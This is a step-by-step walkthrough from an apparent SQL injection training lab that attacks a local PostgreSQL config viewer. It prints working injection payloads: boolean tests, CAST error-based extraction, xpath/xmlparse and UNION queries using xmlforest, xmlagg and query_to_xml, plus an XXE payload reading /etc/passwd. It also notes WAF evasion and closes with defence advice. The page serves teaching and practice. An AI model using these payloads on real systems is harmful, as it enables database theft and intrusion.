<h4>Step 1: Explore the Config Viewer</h4>
<p>
    Start by testing the configuration search with a known key prefix.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Baseline Test</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/pgsql/lab13" \<br> --data-urlencode "key=app"<br><br>
        <span class="prompt">Response: </span>1 | app.name | SQLi-Arena Config Viewer<br>
        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2 | app.version | 2.4.1
    </div>
</div>

<h4>Step 2: Confirm SQL Injection</h4>
<p>
    Test for injection by altering the query logic.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. Injection Confirmation</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/pgsql/lab13" \<br> --data-urlencode "key=' AND 1=1 -- -"<br>
        <span class="prompt">Response: </span>app.name and app.version returned (TRUE condition -- all rows match)<br><br>
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/pgsql/lab13" \<br> --data-urlencode "key=' AND 1=2 -- -"<br>
        <span class="prompt">Response: </span>No configuration entries found matching your search. (FALSE condition)
    </div>
</div>

<h4>Step 3: Error-Based Extraction with CAST</h4>
<p>
    Extract the flag value from the hidden table using the CAST error technique.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. CAST Error Extraction</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/pgsql/lab13" \<br> --data-urlencode "key=' AND 1=CAST((SELECT flag_value FROM hidden_flags LIMIT 1) AS INTEGER) -- -"<br><br>
        <span class="prompt">Response: </span><strong>Query Error:</strong> ERROR:  invalid input syntax for type integer: "FLAG{pg_xml_xp4th_1nj3ct}"
    </div>
</div>

<h4>Step 4: Submit the Flag</h4>
<p>
    Copy the flag from the error message and paste it into the verification form:
    <code>FLAG{pg_xml_xp4th_1nj3ct}</code>.
</p>

<h4>Step 5: XML-Based Extraction with xpath()</h4>
<p>
    PostgreSQL has native XML support. The <code>xpath()</code> function evaluates XPath
    expressions against XML documents. Combined with <code>xmlparse()</code>, this can
    be used for data extraction through error messages.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 5: xpath() Extraction</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">// Build XML doc with embedded secret, extract via xpath, trigger CAST error</span><br>
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/pgsql/lab13" \<br> --data-urlencode "key=' AND 1=CAST(xpath('/x', xmlparse(document '&lt;x&gt;'||(SELECT flag_value FROM hidden_flags LIMIT 1)||'&lt;/x&gt;'))::text AS INTEGER) -- -"<br><br>
        <span class="prompt">Response: </span><strong>Query Error:</strong> ERROR:  invalid input syntax for type integer: "{&quot;&lt;x&gt;FLAG{pg_xml_xp4th_1nj3ct}&lt;/x&gt;&quot;}"<br><br>
        <span class="prompt">// The xpath() result is an xml[] array, the full XML element is returned with curly braces</span><br>
        <span class="prompt">// The actual flag value is: </span>FLAG{pg_xml_xp4th_1nj3ct}
    </div>
</div>

<h4>Step 6: Understanding xmlparse() and xpath()</h4>
<p>
    PostgreSQL's XML functions work together to parse and query XML data:
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 6. XML Functions Explained</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">// xmlparse() -- convert text to XML type</span><br>
        SELECT xmlparse(document '&lt;root&gt;&lt;item&gt;Hello&lt;/item&gt;&lt;/root&gt;');<br><br>
        <span class="prompt">// xpath() -- evaluate XPath expression against XML</span><br>
        SELECT xpath('/root/item/text()', xmlparse(document '&lt;root&gt;&lt;item&gt;Hello&lt;/item&gt;&lt;/root&gt;'));<br>
        <span class="prompt">Result: </span>{Hello}<br><br>
        <span class="prompt">// Combining with subquery for data exfiltration</span><br>
        SELECT xpath('/x/text()', xmlparse(document '&lt;x&gt;'||(SELECT secret)||'&lt;/x&gt;'));<br>
        <span class="prompt">Result: </span>{secret_value_here}
    </div>
</div>

<h4>Step 7: Advanced XML Techniques</h4>
<p>
    Additional XML-based extraction and exploitation methods in PostgreSQL:
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 7. Advanced XML Techniques</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">// xmlforest() -- create XML from column values</span><br>
        <span class="prompt">Input: </span>' UNION SELECT 1, xmlforest(flag_value)::text, '' FROM hidden_flags -- -<br>
        <span class="prompt">Result: </span>&lt;flag_value&gt;FLAG{pg_xml_xp4th_1nj3ct}&lt;/flag_value&gt;<br><br>
        <span class="prompt">// xmlagg() -- aggregate multiple rows into XML</span><br>
        <span class="prompt">Input: </span>' UNION SELECT 1, (SELECT xmlagg(xmlelement(name item, config_value))::text FROM configs), '' -- -<br>
        <span class="prompt">Result: </span>&lt;item&gt;value1&lt;/item&gt;&lt;item&gt;value2&lt;/item&gt;...<br><br>
        <span class="prompt">// query_to_xml() -- convert entire query result to XML</span><br>
        <span class="prompt">Input: </span>' UNION SELECT 1, query_to_xml('SELECT * FROM hidden_flags', true, false, '')::text, '' -- -<br>
        <span class="prompt">Result: </span>Full XML document with all rows and column values
    </div>
</div>

<h4>Step 8: XXE Considerations in PostgreSQL</h4>
<p>
    PostgreSQL's XML parser handles external entities differently from typical XXE scenarios:
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 8. XXE in PostgreSQL</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">// PostgreSQL's libxml2 has entity expansion disabled by default</span><br>
        <span class="prompt">// However, if xmloption is set to 'document' and entities are enabled:</span><br><br>
        <span class="prompt">Payload: </span>SELECT xmlparse(document '&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;');<br><br>
        <span class="prompt">Note: </span>This is typically blocked in modern PostgreSQL (9.2+) as<br>
        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;xmloption defaults to 'content' and external entities are disabled.<br>
        <span class="prompt">Check: </span>SHOW xmloption; -- shows current XML parsing mode
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> PostgreSQL's built-in XML functions (<code>xmlparse()</code>,
    <code>xpath()</code>, <code>xmlforest()</code>, <code>query_to_xml()</code>) provide
    additional vectors for SQL injection data extraction. While CAST errors remain the
    simplest approach, XML functions can bypass certain WAF rules that filter common
    extraction patterns. Defense: use prepared statements, restrict access to XML functions
    if not needed, and implement output encoding to prevent data leakage through error messages.
</div>
